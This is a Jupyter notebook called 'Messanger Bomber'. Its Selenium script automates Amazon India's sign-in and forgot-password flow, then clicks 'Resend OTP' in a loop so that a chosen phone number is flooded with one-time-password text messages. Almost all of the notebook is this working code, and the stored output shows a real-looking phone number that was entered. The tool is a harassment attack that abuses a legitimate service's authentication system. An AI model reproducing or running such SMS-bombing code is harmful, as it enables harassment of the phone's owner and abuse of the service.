{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Messanger Bomber\n",
    "\n",
    "1. Open Google\n",
    "2. Go to Amazon's Website\n",
    "3. Click on Sign In\n",
    "4. Take the phone number as input\n",
    "5. Enter the phone Number\n",
    "6. Click on Continue\n",
    "7. Click on Get an OTP on your phone once\n",
    "8. Click on Resend OTP over and over again\n",
    "9. Close the browser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Pritam\\anaconda3\\lib\\site-packages\\ipykernel_launcher.py:7: DeprecationWarning: use options instead of chrome_options\n",
      "  import sys\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter your phone Number:9831555424\n",
      "Enter number of times you want to send the message:2\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "from selenium import webdriver\n",
    "\n",
    "options = webdriver.ChromeOptions();\n",
    "options.add_argument(\"--disable-notifications\");\n",
    "#options.binary_location = \"D:/GitHUB#\"\n",
    "driver = webdriver.Chrome(\"D:\\\\GitHUB#\\\\chromedriver.exe\", chrome_options=options)\n",
    "\n",
    "driver.get('https://www.amazon.in/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&switch_account=')\n",
    "\n",
    "\n",
    "phone_number=input(\"Enter your phone Number:\")\n",
    "times=input(\"Enter number of times you want to send the message:\")\n",
    "\n",
    "\n",
    "#finding the input number element\n",
    "phone=driver.find_element_by_id('ap_email')\n",
    "phone.send_keys(phone_number)\n",
    "\n",
    "cnt=driver.find_element_by_id('continue')\n",
    "cnt.click()\n",
    "\n",
    "Forgot_password=driver.find_element_by_id('auth-fpp-link-bottom')\n",
    "Forgot_password.click()\n",
    "\n",
    "cnt1=driver.find_element_by_id('continue')\n",
    "cnt1.click()\n",
    "\n",
    "times=int(times)\n",
    "n=times-1\n",
    "for i in range(n):\n",
    "    # click on resend otp\n",
    "    time.sleep(10)\n",
    "    r=driver.find_element_by_link_text(\"Resend OTP\")\n",
    "    r.click()\n",
    "\n",
    "driver.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
